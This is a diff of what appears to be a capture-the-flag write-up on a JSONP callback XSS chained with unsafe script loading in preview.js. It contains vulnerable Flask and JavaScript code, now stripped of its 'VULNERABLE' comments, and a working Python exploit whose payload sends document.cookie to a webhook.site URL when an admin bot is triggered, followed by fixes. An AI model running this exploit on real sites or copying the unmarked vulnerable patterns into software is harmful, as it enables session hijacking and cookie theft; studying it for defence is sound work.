@@ -39,7 +39,7 @@ When combined, an attacker can inject arbitrary JavaScript that executes in the 
 def api_jsonp():
     callback = request.args.get('callback', 'handleData')
     
-    # VULNERABLE: Only filters < and > characters
+    
     if '<' in callback or '>' in callback:
         callback = 'handleData'
     
@@ -53,7 +53,7 @@ def api_jsonp():
         if user:
             user_data['username'] = user.username
     
-    # Callback is directly interpolated into JavaScript response
+    
     response = f"{callback}({json.dumps(user_data)})"
     return Response(response, mimetype='application/javascript')
 ```
@@ -75,13 +75,13 @@ function processContent(container) {
         block.classList.add('highlighted');
     });
     
-    // VULNERABLE: Loads and executes scripts from /api/ endpoints
+    
     const scripts = container.querySelectorAll('script');
     scripts.forEach(function(script) {
         if (script.src && script.src.includes('/api/')) {
             const newScript = document.createElement('script');
             newScript.src = script.src;
-            document.body.appendChild(newScript);  // Executes the script!
+            document.body.appendChild(newScript); 
         }
     });
 }
@@ -177,20 +177,16 @@ WEBHOOK = "https://webhook.site/c11da3ac-5a9f-4205-9e0c-335e68cb5402"
 
 session = requests.Session()
 
-# Register & Login
 session.post(f"{BASE_URL}/register", data={"username": USERNAME, "password": PASSWORD})
 session.post(f"{BASE_URL}/login", data={"username": USERNAME, "password": PASSWORD})
 
-# Create XSS payload
 jsonp_payload = f"fetch('{WEBHOOK}?c='+document.cookie)//"
 encoded_callback = quote(jsonp_payload, safe='')
 payload = f'<script src="/api/jsonp?callback={encoded_callback}"></script>'
 
-# Create malicious post
 post = session.post(f"{BASE_URL}/post/new", data={"title": "Check this out!", "content": payload})
 post_id = post.url.split("/post/")[-1]
 
-# Report to trigger admin bot visit
 session.post(f"{BASE_URL}/report/{post_id}")
 print(f"Exploit delivered! Post ID: {post_id}")
 ```
@@ -219,11 +215,9 @@ import re
 def api_jsonp():
     callback = request.args.get('callback', 'handleData')
     
-    # Only allow alphanumeric characters and underscores
     if not re.match(r'^[a-zA-Z_][a-zA-Z0-9_]*$', callback):
         callback = 'handleData'
-    
-    # ... rest of code
+
 ```
 
 ### Fix 2: Remove Dynamic Script Loading (preview.js)
@@ -235,8 +229,6 @@ function processContent(container) {
         block.classList.add('highlighted');
     });
     
-    // REMOVED: Dynamic script loading
-    // Scripts should not be loaded from user-controlled content
 }
 ```
 
